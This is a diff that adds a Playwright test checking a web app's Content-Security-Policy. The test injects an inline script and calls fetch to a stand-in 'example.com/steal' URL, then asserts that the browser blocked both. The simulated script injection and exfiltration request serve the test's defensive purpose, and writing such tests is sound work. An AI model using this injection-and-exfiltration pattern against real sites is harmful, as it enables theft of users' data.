@@ -150,3 +150,28 @@ test.describe('installable app', () => {
     await context.setOffline(false)
   })
 })
+
+test.describe('Content-Security-Policy', () => {
+  test.use({ strictCsp: false })
+
+  test('runs no script it wasn’t built with, and talks to GitHub only', async ({
+    page,
+    cspViolations,
+  }) => {
+    await signIn(page)
+    const ran = await page.evaluate(async () => {
+      const script = document.createElement('script')
+      script.textContent = 'window.__injected = true'
+      document.body.append(script)
+      const sent = await fetch('https://example.com/steal').then(
+        () => true,
+        () => false,
+      )
+      return { script: 'injected' in window, sent }
+    })
+    expect(ran).toEqual({ script: false, sent: false })
+    await expect
+      .poll(() => cspViolations.map((v) => v.split(' ')[0]))
+      .toEqual(expect.arrayContaining(['script-src-elem', 'connect-src']))
+  })
+})
